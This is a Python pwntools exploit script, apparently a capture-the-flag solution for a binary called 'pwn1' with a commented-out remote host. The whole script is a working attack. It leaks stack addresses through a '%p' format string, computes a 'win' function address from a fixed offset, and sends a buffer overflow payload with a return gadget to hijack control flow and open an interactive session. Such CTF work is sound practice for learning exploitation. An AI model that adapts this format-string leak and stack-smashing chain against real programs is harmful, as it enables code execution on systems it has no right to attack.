from pwn import *

p = process("./pwn1")
#p = remote("hax1.allesctf.net", 9100)
FORMATSTRING = "|".join(["%p" for _ in xrange(0,42)])
MAIN_TO_WIN_OFFEST = 0x135

p.recvuntil("Enter your witch name:")
p.sendline(FORMATSTRING)

LEAKS = p.recvuntil("enter your magic spell:").split("|")
MAIN = int(LEAKS[-4], 16)

log.info("Leaked return value 0x{:x}".format(MAIN))
WIN = MAIN-MAIN_TO_WIN_OFFEST
RET = WIN+0x36

raw_input("attach gdb")
PADDING = "A"*cyclic_find("cnaa")
p.sendline("Expelliarmus\x00" + PADDING + p64(RET) + p64(WIN))
p.interactive()